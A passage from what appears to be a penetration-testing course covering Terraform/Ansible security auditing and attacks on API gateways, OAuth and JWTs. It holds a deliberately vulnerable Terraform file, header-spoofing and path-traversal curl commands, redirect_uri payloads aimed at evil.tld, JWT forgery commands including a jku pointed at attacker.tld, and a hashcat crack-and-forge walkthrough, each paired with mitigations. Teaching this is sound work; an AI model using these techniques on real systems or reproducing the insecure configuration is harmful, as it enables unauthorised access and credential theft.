module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "= 5.1.2"    # exact, not "~>"
}
15.2 Ansible Galaxy Risks
# List installed community roles:
ansible-galaxy role list

# requirements.yml should pin versions and use full URLs:
- src: https://github.com/geerlingguy/ansible-role-nginx
  version: 3.1.4

Roles from Galaxy execute as root during a play. A compromised role compromises every host it runs against.
15.3 Detecting Malicious Behavior
# Look for network callbacks in third-party module source:
grep -rEn 'http.get\|http.post\|http.request' .terraform/modules/
grep -rEn '(url|source|uri)\s*=\s*"https?://' .terraform/modules/

# Look for exec/shell in Ansible roles:
grep -rEn 'ansible\.builtin\.(shell|command|raw)' ~/.ansible/roles/
15.4 Private Registries

Terraform Cloud, Artifactory, and GitLab all support private module registries. Publishing internal modules there — instead of copying from public registries — cuts the supply-chain surface dramatically.
16. Hands-On — Auditing a Vulnerable Terraform File

Save the following as /tmp/vulnerable.tf:
provider "aws" {
  region     = "us-east-1"
  access_key = "AKIAIOSFODNN7EXAMPLE"
  secret_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
}

resource "aws_s3_bucket" "public_data" {
  bucket = "acme-public-data-2026"
}

resource "aws_s3_bucket_public_access_block" "public_data" {
  bucket                  = aws_s3_bucket.public_data.id
  block_public_acls       = false
  block_public_policy     = false
  ignore_public_acls      = false
  restrict_public_buckets = false
}

resource "aws_s3_bucket_acl" "public_data" {
  bucket = aws_s3_bucket.public_data.id
  acl    = "public-read"
}

resource "aws_security_group" "web" {
  name = "web-sg"
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_iam_policy" "admin" {
  name = "app-admin"
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect   = "Allow"
      Action   = "*"
      Resource = "*"
    }]
  })
}

resource "aws_db_instance" "prod" {
  identifier          = "prod-db"
  engine              = "postgres"
  instance_class      = "db.t3.micro"
  allocated_storage   = 20
  username            = "admin"
  password            = "SuperSecret123!"
  publicly_accessible = true
  storage_encrypted   = false
  skip_final_snapshot = true
}
16.1 Manual Review
cd /tmp
grep -En 'AKIA[0-9A-Z]{16}' vulnerable.tf
# 3:  access_key = "AKIAIOSFODNN7EXAMPLE"

grep -En '"Action"\s*=\s*"\*"|"Resource"\s*=\s*"\*"' vulnerable.tf

grep -En 'cidr_blocks\s*=\s*\["0\.0\.0\.0/0"\]' vulnerable.tf

grep -En 'publicly_accessible\s*=\s*true|storage_encrypted\s*=\s*false' vulnerable.tf

grep -En 'acl\s*=\s*"public-read"|block_public.*=\s*false' vulnerable.tf

Findings:

    Hardcoded AWS access key and secret in provider block
    Wildcard IAM policy (Action=* on Resource=*)
    SSH open to the internet
    Publicly-accessible unencrypted RDS instance with hardcoded password
    Public S3 bucket with all public-access blocks disabled

16.2 Automated Confirmation
mkdir -p /tmp/tf-audit && cp /tmp/vulnerable.tf /tmp/tf-audit/
cd /tmp/tf-audit
terraform init -backend=false

tfsec .
checkov -d .
gitleaks detect --source .

tfsec will flag at minimum:

    aws-iam-no-policy-wildcards
    aws-s3-block-public-acls
    aws-s3-block-public-policy
    aws-s3-no-public-buckets
    aws-vpc-no-public-ingress-sgr
    aws-rds-encrypt-instance-storage-data
    aws-rds-no-public-db-access

16.3 Rewritten Safe Form
terraform {
  required_providers {
    aws    = { source = "hashicorp/aws",    version = "~> 5.0" }
    random = { source = "hashicorp/random", version = "~> 3.6" }
  }
}

provider "aws" {
  region = "us-east-1"
  # Credentials come from the environment, an IAM role, or SSO — never inline.
}

data "aws_vpc" "default" { default = true }

resource "random_password" "db" {
  length  = 32
  special = true
}

resource "aws_secretsmanager_secret" "db" {
  name = "prod/postgres/master"
}

resource "aws_secretsmanager_secret_version" "db" {
  secret_id     = aws_secretsmanager_secret.db.id
  secret_string = random_password.db.result
}

resource "aws_s3_bucket" "private_data" {
  bucket = "acme-private-data-2026"
}

resource "aws_s3_bucket_public_access_block" "private_data" {
  bucket                  = aws_s3_bucket.private_data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

resource "aws_s3_bucket_server_side_encryption_configuration" "private_data" {
  bucket = aws_s3_bucket.private_data.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
  }
}

resource "aws_s3_bucket_versioning" "private_data" {
  bucket = aws_s3_bucket.private_data.id
  versioning_configuration { status = "Enabled" }
}

resource "aws_security_group" "web" {
  name   = "web-sg"
  vpc_id = data.aws_vpc.default.id
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/8"]   # internal only
  }
}

resource "aws_iam_policy" "app" {
  name = "app-least-privilege"
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect   = "Allow"
      Action   = ["s3:GetObject", "s3:PutObject"]
      Resource = "${aws_s3_bucket.private_data.arn}/*"
    }]
  })
}

resource "aws_db_instance" "prod" {
  identifier          = "prod-db"
  engine              = "postgres"
  instance_class      = "db.t3.micro"
  allocated_storage   = 20
  username            = "admin"
  password            = random_password.db.result
  publicly_accessible = false
  storage_encrypted   = true
  kms_key_id          = aws_kms_key.db.arn
  skip_final_snapshot = false
}

resource "aws_kms_key" "db" {
  description         = "RDS encryption key"
  enable_key_rotation = true
}

Re-run the scanners against the rewrite; they should return zero findings.
17. Exercises
17.1 Guided Exercises

Exercise 1 — Terraform state extraction.

Given a terraform.tfstate file (create one by running terraform apply on the safe rewrite above with terraform { backend "local" {} }), extract:

    Every RDS master password
    Every IAM user's access key
    Every generated random_password.result

Use jq only. Verify by comparing to the plaintext values you know were generated.

Exercise 2 — Ansible vault crack.

Create an encrypted vault file with a weak passphrase (ansible-vault encrypt --ask-vault-pass secrets.yml, using a password from rockyou.txt). Convert it with ansible2john.py and crack it with John the Ripper. Time the operation. Change the passphrase to a 25-character random string and repeat — observe the difference in feasibility.

Exercise 3 — Drift injection.

Deploy the safe rewrite from section 16.3 into a sandbox AWS account. Then manually add an inbound rule to the security group via the AWS Console (port 80 from 0.0.0.0/0). Run terraform plan and driftctl scan. Observe how each tool reports the drift.
17.2 Independent Exercises

Exercise 4 — Repository sweep.

Pick any public infrastructure-heavy GitHub organization (e.g., one of your own personal repos or a well-known open-source infra project). Run gitleaks detect --log-opts='--all' and trufflehog git. Categorize findings by severity and by whether the secret is still active. Do not attempt to use any found credentials.

Exercise 5 — Policy authoring.

Write an OPA Rego policy that denies any Terraform plan that:

    Creates an S3 bucket without server-side encryption
    Creates a security group rule with 0.0.0.0/0 on any port other than 80 or 443
    Attaches an IAM policy containing Action = "*"

Test it against both the vulnerable and safe versions from section 16.

Exercise 6 — Cloud-init hunt.

Launch an EC2 instance with a user-data script containing an obvious secret. From the instance, retrieve the user-data via IMDSv2. Then, from a second instance in the same VPC, attempt to reach the first instance's IMDS via SSRF (using a small web app of your choice). Document what the SSRF gains you and what IMDSv2 defeats.
18. Summary and Next Lesson

Infrastructure as Code is a double-edged sword. For defenders, it makes the environment auditable, reviewable, and reproducible. For attackers, it collapses discovery, mapping, and exploitation into a single git clone. Every Terraform state file is a bag of passwords. Every Ansible playbook is a root-shell payload. Every user-data blob is a bootstrap credential broker. Every module dependency is an unaudited executable running with cloud-admin privileges.

Key takeaways from this lesson:

    Treat any IaC repository as a top-value target; source code is the map to the terrain
    Terraform state files hold every resource attribute in plaintext — protect them like keys
    Read HCL and YAML with grep patterns for wildcards, public flags, and 0.0.0.0/0 before running any scanner
    Run tfsec, checkov, and terrascan together; they overlap but do not duplicate
    Ansible Vault is only as safe as the passphrase and where it lives — check for committed .vault_pass
    Cloud-init user-data is a first-class secret store reachable via IMDS and SSRF
    Packer and CDK add code-execution surfaces at build time; audit their pipelines
    Drift is unapproved infrastructure — every rule not in Terraform bypassed the review process
    gitleaks + trufflehog belong in day-one recon; validate every finding before reporting
    Policy-as-code stops issues at merge time — its absence is itself a finding

The next lesson, Lesson 11 — Container Orchestration Security, moves from the code that provisions infrastructure to the platforms that run workloads on top of it: Kubernetes, its API surface, RBAC misconfigurations, admission controllers, and cluster-level lateral movement. Bring the mindset from this lesson with you — Kubernetes manifests are IaC too, and everything you learned about scanning, secrets, and drift applies to them.

























Lesson 11 — API Gateway and Authentication Architecture

    Module 04: Containers and Software Architecture · Penetration Testing with Kali Linux 2026 · Red Team Leaders

Introduction

Modern APIs are almost never protected by a single control. In front of the application sits an API gateway that enforces authentication, in front of that a Web Application Firewall (WAF) inspects payloads, behind it an identity provider issues OAuth tokens that ride inside JSON Web Tokens (JWTs), and rate limiters throttle abusive callers along the way. Each layer is engineered to be strong on its own, yet the assumptions each layer makes about the others create the seams a penetration tester lives in.

This lesson walks the full stack from the outside in — gateway, then authorization protocol, then token format, then session — and for every layer shows the class of bypass, the tool that exercises it, and the mitigation that finally closes it. By the end you will be able to reason about a request the way an attacker does: which control saw it, which control trusted the previous one blindly, and which layer contains the flaw that ends the engagement with an admin token in your hands.
1. Introduction — A Stack, Not a Wall

A production API request in 2026 typically crosses at least six distinct trust boundaries before it reaches the business logic.
Client ──▶ CDN/WAF ──▶ Load Balancer ──▶ API Gateway ──▶ Service Mesh ──▶ Microservice ──▶ Database
              │             │                  │                │              │
              │             │                  │                │              └─ row-level auth
              │             │                  │                └─ mTLS peer identity
              │             │                  └─ token introspection, rate limit, transform
              │             └─ TLS termination, header stripping
              └─ pattern matching, bot scoring, geo filtering

Each hop rewrites, drops, or adds headers. Each hop makes an authorization decision or delegates it. Each hop trusts the previous hop implicitly for at least one piece of information — most often the client's identity, the client's IP, or the fact that the request has already been "cleaned." A pentester's job is to find the one boundary where the trust is wrong and then push a request through it that the layer behind was never supposed to see.

    Pentester Insight: Never model the security of an API as the strongest control. Model it as the weakest hand-off between two controls. A perfect WAF in front of a gateway that trusts X-User-Id from any source is not defended — it is instrumented for the attacker.

2. The API Gateway Landscape — The Choke-Point Pattern

An API gateway is a reverse proxy specialized for API traffic. It provides a single ingress in front of many backend services and centralizes cross-cutting concerns so each microservice does not have to reimplement them.
2.1 Common Gateway Products
Gateway	Deployment	Primary Language	Where You Meet It
Kong	Self-hosted, Konnect SaaS	Lua on OpenResty/nginx	Enterprises with many teams
AWS API Gateway	Managed (REST, HTTP, WebSocket)	Closed	AWS-native shops, Lambda backends
Google Apigee	Managed	Closed	Regulated industries, monetized APIs
Envoy	Self-hosted, service mesh	C++	Istio, AWS App Mesh, Consul Connect
Traefik	Self-hosted, Kubernetes-native	Go	Docker/K8s clusters, quick starts
Netflix Zuul	Self-hosted (legacy)	Java/Groovy	Spring Cloud, older estates
Tyk	Self-hosted, SaaS	Go	Mid-market, multi-region
2.2 The Choke-Point Pattern

The gateway is a single ingress point where every request lands before touching business logic. That concentration is its value and its liability.
                        ┌─────────────┐
       Public Traffic ──▶│   Gateway   │──▶  users-service (10.0.1.10:8080)
                        │             │──▶  orders-service (10.0.1.11:8080)
                        │  authn      │──▶  billing-service (10.0.1.12:8080)
                        │  authz      │──▶  admin-service  (10.0.1.13:8080)
                        │  rate-limit │
                        │  transform  │
                        └─────────────┘

The gateway is the only host the internet is supposed to reach. Every backend listens on an RFC 1918 address inside a VPC or a Kubernetes cluster network. If a pentester can talk directly to any backend, the gateway's controls are irrelevant to that call.
2.3 Enumerating the Gateway
# Fingerprint the gateway from response headers:
curl -sI https://api.example.com/ | grep -Ei 'server|via|x-kong|x-envoy|x-amzn|x-apigee'
# Server: kong/3.7.1
# X-Kong-Proxy-Latency: 3
# Via: kong/3.7.1

# AWS API Gateway signature:
# x-amzn-RequestId: e2f4c5b0-1234-5678-9abc-def012345678
# x-amz-apigw-id: aBcDeFgHiJkLmNo=

# Envoy signature:
# server: envoy
# x-envoy-upstream-service-time: 12

# Apigee signature:
# X-Powered-By: Apigee
# Via: 1.1 google
3. Common Gateway Policies

Every gateway offers roughly the same catalog of policies. The names differ; the semantics do not.
3.1 Authentication (authn)

The gateway verifies the caller's identity before forwarding. Common mechanisms:

    API key: caller sends X-API-Key: ak_live_...; gateway looks it up in a key store.
    OAuth 2.0 bearer token: caller sends Authorization: Bearer eyJhbGc...; gateway introspects or validates locally.
    mTLS: caller presents an X.509 client certificate during the TLS handshake.
    HMAC signature: caller signs the request with a shared secret; gateway recomputes and compares.

3.2 Authorization (authz)

Once identity is known, the gateway decides whether that identity may perform the requested action. This is usually one of:

    Scope check: does the token include the scope orders:write?
    Role check: does the caller belong to a group like admin?
    Attribute-based access control (ABAC): policy engine (OPA, Cedar) evaluates a rule set.

3.3 Rate Limiting

Bounds how many requests a caller may issue per time window. See §14 for the algorithmic taxonomy and its bypasses.
3.4 Request / Response Transformation

The gateway rewrites headers, paths, and bodies:
# Example Kong plugin: strip a caller-supplied header, inject a trusted one.
plugins:
  - name: request-transformer
    config:
      remove:
        headers:
          - X-User-Id            # untrusted from client
      add:
        headers:
          - X-User-Id:$(jwt.sub) # trusted, derived from validated JWT

The transformation is where the authenticity of "who is this caller" is materialized into a header the backend can read cheaply. This exact pattern is also a bypass vector — see §4.
3.5 mTLS Termination

The gateway typically terminates TLS from the internet and re-establishes a new (often mTLS) session to the backend. The upstream now sees the gateway's identity, not the caller's.
4. Gateway Bypass

The gateway is only a control if every request touching a backend actually crossed it. Three patterns make that assumption false.
4.1 Reaching the Backend Directly

If the backend is exposed by IP or by internal DNS from anywhere the attacker can reach, the gateway becomes optional.
# During internal recon, sweep for exposed backends:
nmap -p 8080,8443,9000,3000 -sS --open 10.0.1.0/24 -oA backend-sweep

# Or, from a compromised host inside the VPC, resolve internal service DNS:
dig +short users-service.default.svc.cluster.local
# 10.42.1.15

curl -sv http://10.42.1.15:8080/users/1
# HTTP/1.1 200 OK  ← no auth required; the gateway was the only wall.

The classic finding is a backend that expects the gateway to have done authentication and therefore does none itself. If you can route around the gateway, you route around every policy it enforces.
4.2 Authoritative Header Trust

A gateway frequently injects a header like X-User-Id, X-Consumer-Id, or X-Authenticated-User after successful authn, and the backend uses that header verbatim to identify the caller.

If the backend does not verify where the header came from, an attacker who reaches the backend directly can spoof it:
# Direct call to the backend, impersonating user 1 (typically admin):
curl -H 'X-User-Id: 1' -H 'X-User-Roles: admin' \
     http://10.42.1.15:8080/admin/users

# Even through the gateway, if the gateway forwards caller-supplied
# X-User-Id instead of stripping and re-injecting it:
curl -H 'X-User-Id: 1' https://api.example.com/admin/users

The mitigation is the request-transformer pattern from §3.4: the gateway must remove any incoming X-User-Id and re-add its own trusted value. Backends must additionally refuse the header from any source but the gateway's internal IP or client cert.
4.3 Path Traversal in Route Matching

Gateways match paths against route patterns. Some implementations normalize .. and %2f differently than the backend, letting an attacker land on a route the gateway thinks is public while the backend serves it as privileged.
# Gateway route: /public/*  → no auth
# Gateway route: /admin/*   → requires admin scope

# Attacker sends:
curl -sv 'https://api.example.com/public/..%2fadmin%2fusers'
# Gateway matches on the raw prefix "/public/" → authn skipped.
# Backend normalizes %2f to /  → serves /admin/users.

Envoy CVE-2021-29492, Zuul path-traversal issues, and multiple Kong regex-route CVEs are all instances of this class. Always test at least: %2e%2e%2f, ..;/, ..%00/, .%2e/, and trailing %00 bytes.
5. OAuth 2.0 Flows in Depth

OAuth 2.0 is an authorization delegation protocol defined in RFC 6749 and refined by the "OAuth 2.1" consolidation. It defines how a resource owner (the human user) grants a client (an application) limited access to a resource server (the API), mediated by an authorization server (the identity provider).
5.1 Authorization Code with PKCE (the default flow in 2026)
Browser (user)        Client App          Auth Server              Resource Server
     │                    │                    │                          │
     │  1. click login    │                    │                          │
     │───────────────────▶│                    │                          │
     │                    │ 2. redirect w/     │                          │
     │                    │    code_challenge  │                          │
     │◀───────────────────│                    │                          │
     │  3. authorize      │                    │                          │
     │─────────────────────────────────────────▶│                          │
     │  4. redirect w/ authorization_code       │                          │
     │◀─────────────────────────────────────────│                          │
     │  5. code                                  │                          │
     │───────────────────▶│                    │                          │
     │                    │ 6. code + verifier  │                          │
     │                    │────────────────────▶│                          │
     │                    │ 7. access_token +   │                          │
     │                    │    refresh_token    │                          │
     │                    │◀────────────────────│                          │
     │                    │ 8. API call w/ token│                          │
     │                    │─────────────────────────────────────────────▶ │

PKCE (Proof Key for Code Exchange, RFC 7636) binds the token exchange to the browser that started the flow, defeating code interception in public clients.
# Generate a PKCE verifier and challenge locally:
python3 -c "
import base64, hashlib, secrets
v = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b'=').decode()
c = base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).rstrip(b'=').decode()
print('verifier :', v)
print('challenge:', c)
"
5.2 Client Credentials

Server-to-server. The client authenticates with its own credentials — no user involved.
curl -X POST https://auth.example.com/oauth/token \
  -u 'svc_client_id:svc_client_secret' \
  -d 'grant_type=client_credentials&scope=orders:read'
5.3 Device Code

For inputs-constrained devices (TVs, CLI tools). The device shows a code the user types on their phone.
# Step 1 — device asks for a code:
curl -X POST https://auth.example.com/oauth/device/code \
  -d 'client_id=cli_tool&scope=read'

# Step 2 — device polls until the user authorizes on another screen:
curl -X POST https://auth.example.com/oauth/token \
  -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code' \
  -d 'device_code=GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS' \
  -d 'client_id=cli_tool'
5.4 Refresh Token

Long-lived credential used to obtain a new access token when the current one expires.
curl -X POST https://auth.example.com/oauth/token \
  -d 'grant_type=refresh_token' \
  -d 'refresh_token=v1.MjE0MDgtY2NmZjItMDA3MDc' \
  -d 'client_id=web_app'
5.5 Deprecated Flows

    Implicit flow (response_type=token): access token returned in the URL fragment. Removed by OAuth 2.1 because of Referer leakage and browser-history exposure.
    Resource Owner Password Credentials (grant_type=password): the client collects the user's password directly. Removed because it defeats the whole purpose of federated auth.

Finding either flow enabled in 2026 is itself a report-worthy issue.
6. Common OAuth Flaws
6.1 redirect_uri Validation Weakness

If the authorization server does exact-match validation, you cannot substitute the redirect. If it does prefix or substring matching, you can.
# Registered URI: https://app.example.com/callback
# Test bypasses:

# Sub-path exploitation:
?redirect_uri=https://app.example.com/callback/../evil
# Open redirect chain:
?redirect_uri=https://app.example.com/callback?next=https://evil.tld
# Domain confusion:
?redirect_uri=https://app.example.com.evil.tld/callback
# Path traversal on the auth server side:
?redirect_uri=https://app.example.com%2f@evil.tld/callback

A successful bypass returns the authorization code to an attacker-controlled origin, which the attacker exchanges for a token.
6.2 Missing PKCE

Any public client (SPA, mobile app, CLI) that runs the authorization code flow without PKCE is vulnerable to code interception on the loopback/custom-scheme handler.
6.3 CSRF via Missing state Validation

The state parameter is a CSRF token bound to the browser that initiated the login. If the client does not validate it on return, an attacker can force the victim's browser to complete a flow using the attacker's authorization code — logging the victim into the attacker's account, from which they will happily paste bank details.
6.4 Referer Leakage of Tokens in URL Fragments

Legacy implicit-flow returns leak into Referer headers when the landing page loads any third-party resource (analytics, fonts, images). Anything that logs referrers logs tokens.
6.5 Weak or Missing Client Authentication

Confidential clients are supposed to authenticate to the token endpoint. Many misconfigured servers accept an empty client_secret or fall back to public-client behavior when authentication fails, letting anyone redeem a code they intercepted.
7. OpenID Connect on Top of OAuth

OpenID Connect (OIDC) is an identity layer on top of OAuth 2.0. It adds:

    id_token: a signed JWT carrying claims about the user (sub, email, email_verified, aud, iss, nonce, exp).
    UserInfo endpoint: /userinfo returns claims when queried with a valid access token.
    JWKS endpoint: /.well-known/jwks.json publishes the public keys the identity provider uses to sign tokens.
    Discovery document: /.well-known/openid-configuration publishes every relevant URL, supported algorithms, and claim types.

# Start every OIDC assessment here:
curl -s https://auth.example.com/.well-known/openid-configuration | jq .

# Fetch the signing keys:
curl -s https://auth.example.com/.well-known/jwks.json | jq .

The sub claim is the stable, unique identifier for the end user across sessions. Never use email as an identifier — emails can be reassigned; sub cannot.
8. JWT Structure

A JSON Web Token (RFC 7519) is three base64url-encoded segments joined by dots:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.mmS9J-vqZ7ubM7q9U9c9Zk5H_pS8yqAK1SdW7Y1r7oI
└──────────── header ────────────┘.└────────── payload ──────────┘.└──────────── signature ────────────┘
8.1 Decoding
# Manual decode with base64 (add padding as needed):
python3 -c "
import base64, json
t = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
pad = '=' * (-len(t) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(t + pad)), indent=2))
"

# Or use jwt_tool (ships in Kali 2026):
jwt_tool eyJhbGciOi...
8.2 Algorithms in Common Use
alg	Family	Key Type	Notes
HS256	HMAC-SHA256	Shared symmetric secret	Fast, dangerous if secret leaks or is weak
HS384/512	HMAC-SHAx	Shared symmetric secret	Same properties, stronger digest
RS256	RSA-PKCS1-v1_5 SHA-256	RSA private key	Public key can be widely distributed
RS384/512	RSA-PKCS1-v1_5 SHAx	RSA private key	As above
PS256	RSASSA-PSS SHA-256	RSA private key	Modern, avoids PKCS1-v1_5 issues
ES256	ECDSA P-256 SHA-256	EC private key	Small keys and signatures
EdDSA	Ed25519	Ed25519 private key	Modern default, deterministic
none	(no signature)	—	Must be rejected; historical bypass
9. Classic JWT Attacks

Every attack below is a failure of the verifier to enforce something the header claims.
9.1 alg: none

The token declares no signature; a verifier that trusts the header will accept it unsigned.
jwt_tool -X a eyJhbGciOi...
# jwt_tool automatically generates alg:none, alg:None, alg:NONE variants.
9.2 HS256 ↔ RS256 Key Confusion

The token was originally signed RS256 with an RSA private key. The verifier calls verify(token, public_key) and picks the algorithm from the token header. If the attacker changes alg to HS256 and signs the token using the public key as the HMAC secret, the verifier will HMAC-verify using the same public key and succeed.
# Fetch the public key from JWKS:
curl -s https://auth.example.com/.well-known/jwks.json | jq -r '.keys[0]' > jwks.json

# Convert JWK to PEM:
python3 -c "
from jwcrypto import jwk
import json
k = jwk.JWK.from_json(open('jwks.json').read())
open('pub.pem','w').write(k.export_to_pem().decode())
"

# Forge with jwt_tool:
jwt_tool -X k -pk pub.pem eyJhbGciOi...
9.3 JWKS jku Header Pointing to Attacker

A JWT header may declare jku (JWK Set URL) or x5u (X.509 URL) telling the verifier where to fetch the key. A naive verifier fetches from any URL the header names.
# Host attacker.tld/jwks.json with a public key you control:
python3 -m http.server 8000 &

# Forge the token so its header points at your JWKS:
jwt_tool -X s -pr priv.pem -I -hc jku -hv 'https://attacker.tld/jwks.json' TOKEN

Mitigation: pin jku to an allow-list of exact URLs, or ignore the header entirely and always use the configured JWKS.
9.4 kid Path Traversal / SQL Injection

The kid (key id) header selects which key from a set to use. If the verifier passes kid unfiltered into a filesystem read or SQL query, classic injection works:
# Path traversal on kid, pointing at a known file for symmetric HMAC:
jwt_tool -X i -I -hc kid -hv '../../../../../../dev/null' TOKEN
# /dev/null is empty ⇒ HMAC secret is the empty string.
9.5 Empty Signature

Some verifiers strip trailing whitespace / bytes and short-circuit if signature == "". Truncating the third segment to nothing (while keeping the trailing dot) tests this.
9.6 Weak HS256 Secret

If HS256 is used with a short or common secret ("secret", "changeme", "supersecret"), it is offline-crackable. See §11.
10. Modern JWT Hygiene

The following are the current defaults for a hardened JWT verifier in 2026:

    Algorithm pinned server-side. The verifier is instantiated with exactly one algorithm; the token header's alg is ignored for selection and only cross-checked for equality.
    JWKS with kid allow-list. Only known key ids are honoured; unknown ids are rejected without any network fetch.
    jku / x5u disabled or allow-listed. No fetch to an arbitrary URL, ever.
    Short TTL on access tokens. Five to fifteen minutes is typical; anything longer moves you into refresh-token territory.
    Refresh tokens rotate. Each redemption invalidates the previous refresh token; reuse is a compromise signal.
    Revocation list for high-risk sessions. A denylist of jti (JWT ID) values with entries expiring at token exp.
    aud and iss validated on every request. A token minted for api.internal must not be accepted at api.public.
    Clock skew capped. Typically ±30 seconds; anything larger accepts too-old tokens.

11. jwt_tool and hashcat — Full Attack Walkthrough

The Kali 2026 image ships both tools. This section walks a complete crack-and-forge against a lab token.
11.1 Lab Setup
# In one terminal, spin up a minimal HS256-issuing Flask app:
mkdir -p /root/lab-jwt && cd /root/lab-jwt
cat > app.py <<'PY'
from flask import Flask, request, jsonify
import jwt, time
app = Flask(__name__)
SECRET = "peanuts"   # deliberately weak
@app.post("/login")
def login():
    d = request.get_json(force=True)
    if d.get("user") == "alice" and d.get("pw") == "alice":
        t = jwt.encode({"sub":"alice","role":"user","exp":int(time.time())+3600},
                       SECRET, algorithm="HS256")
        return jsonify(token=t)
    return "no", 401
@app.get("/whoami")
def whoami():
    tok = request.headers["Authorization"].split()[1]
    try:
        c = jwt.decode(tok, SECRET, algorithms=["HS256"])
    except Exception as e:
        return str(e), 401
    return jsonify(c)
app.run(host="127.0.0.1", port=5000)
PY
python3 app.py &
11.2 Capture a Token
curl -s -X POST http://127.0.0.1:5000/login \
  -H 'Content-Type: application/json' \
  -d '{"user":"alice","pw":"alice"}' | jq -r .token > token.txt
cat token.txt
# eyJhbGciOiJIUzI1NiIs...
11.3 Inspect It
jwt_tool $(cat token.txt)
# Token header values:
# [+] alg = "HS256"
# [+] typ = "JWT"
# Token payload values:
# [+] sub = "alice"
# [+] role = "user"
# [+] exp = 1770000000
11.4 Crack HS256 with hashcat Mode 16500

hashcat -m 16500 accepts the full JWT as input and cracks the shared secret against a wordlist.
# Write the token to a file hashcat can consume:
cp token.txt jwt.hash

# Attack with rockyou:
hashcat -m 16500 -a 0 jwt.hash /usr/share/wordlists/rockyou.txt

# Typical output:
# eyJhbGciOi....:peanuts
# Session..........: hashcat
# Status...........: Cracked

For rules-based attacks add -r /usr/share/hashcat/rules/best64.rule. For mask attacks (-a 3 ?a?a?a?a?a?a?a?a) expect exponential time in secret length.
11.5 Forge an Admin Token

Once you own the secret, mint whatever payload you want:
jwt_tool $(cat token.txt) -T
# jwt_tool prompts for edits to each claim; set role=admin, sub=admin.
# It then re-signs with a provided secret:
jwt_tool $(cat token.txt) -T -S hs256 -p peanuts
# Outputs the forged token.

Alternatively in Python:
python3 -c "
import jwt, time
print(jwt.encode({'sub':'admin','role':'admin','exp':int(time.time())+3600},
                 'peanuts', algorithm='HS256'))
"
11.6 Use the Forged Token
FORGED=$(python3 -c "
import jwt, time
print(jwt.encode({'sub':'admin','role':'admin','exp':int(time.time())+3600},
                 'peanuts', algorithm='HS256'))")
curl -s http://127.0.0.1:5000/whoami -H "Authorization: Bearer $FORGED"
# {"exp":...,"role":"admin","sub":"admin"}
11.7 Re-issue with RS256 and JWKS Pinning

The remediated app:
import jwt, time
from cryptography.hazmat.primitives import serialization
priv = serialization.load_pem_private_key(open("priv.pem","rb").read(), None)
tok = jwt.encode({"sub":"alice","role":"user","exp":int(time.time())+900,
                  "iss":"https://auth.lab","aud":"api.lab"},
                 priv, algorithm="RS256", headers={"kid":"2026-01"})

# On the verifier side, the algorithm is pinned and kid is whitelisted:
pub = open("pub.pem","rb").read()
claims = jwt.decode(tok, pub, algorithms=["RS256"],
                    audience="api.lab", issuer="https://auth.lab",
                    options={"require": ["exp","iss","aud","sub"]})

The attacker can no longer sign tokens — they do not have the private key. HS256 with the public key as secret is blocked because the algorithm is not in the pinned list.
12. API Key Patterns

API keys are shared secrets, and every place they touch is a leakage risk.
12.1 Transport Locations
# Header (recommended):
curl -H 'X-API-Key: ak_live_...' https://api.example.com/orders

# Authorization header:
curl -H 'Authorization: Bearer ak_live_...' https://api.example.com/orders

# HTTP Basic (the key as username, empty password — Stripe-style):
curl -u 'ak_live_...:' https://api.example.com/orders

# Query string (DANGEROUS):
curl 'https://api.example.com/orders?api_key=ak_live_...'
12.2 Leakage Channels

    Access logs. Query-string keys land in nginx/ALB/CloudFront logs, in shipping pipelines, and in downstream SIEMs. A single log-store compromise leaks every historical caller's key.
    Browser history and bookmarks. URL-embedded keys are stored client-side forever.
    Referer header. A page loaded with ?api_key= in the URL leaks it to every third-party asset (fonts, analytics, ad networks) it renders.
    Git commits. .env, config.yml, and hard-coded strings; use gitleaks detect --source . -v on any target repo you have access to.
    Client-side JS bundles. curl -s https://app.example.com/main.js | grep -Eo 'ak_[a-z]{4}_[A-Za-z0-9]{20,}'.
    Mobile app resources. apktool d app.apk && grep -RE 'ak_(live|test)_' app/.

12.3 Key Hygiene

    Random 128+ bits of entropy, prefix with an identifiable string (sk_live_, AKIA…).
    Rotate on any suspicion; support at least two active keys per client for zero-downtime rotation.
    Bind keys to source IP ranges and scopes so a leaked read-only key from a batch worker cannot be used to write from anywhere.
    Provide programmatic revocation and expiry.

13. mTLS Between Clients and Gateway

Mutual TLS extends the TLS handshake to require the client to present a certificate, giving the gateway a cryptographic identity for every caller.
13.1 Issuing a Client Certificate
# Create a private CA (lab):
openssl genrsa -out ca.key 4096
openssl req -x509 -new -nodes -key ca.key -sha256 -days 3650 \
  -out ca.crt -subj "/CN=Lab Root CA"

# Client key + CSR:
openssl genrsa -out client.key 2048
openssl req -new -key client.key -out client.csr \
  -subj "/CN=svc-orders-01/OU=orders/O=example"

# Sign it with the CA:
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key \
  -CAcreateserial -out client.crt -days 365 -sha256
13.2 Using the Cert
curl --cert client.crt --key client.key --cacert ca.crt \
     https://api.example.com/orders
13.3 Revocation

    CRL (Certificate Revocation List): the CA publishes a signed list of revoked serials; verifiers fetch it periodically.
    OCSP (Online Certificate Status Protocol): the verifier queries the CA per-cert with a nonce.
    OCSP stapling: the presenter attaches a recent OCSP response so the verifier does not need to reach the CA.

# Check a cert against an OCSP responder:
openssl ocsp -issuer ca.crt -cert client.crt -url http://ocsp.lab \
  -CAfile ca.crt -text
13.4 Classic Misconfigurations

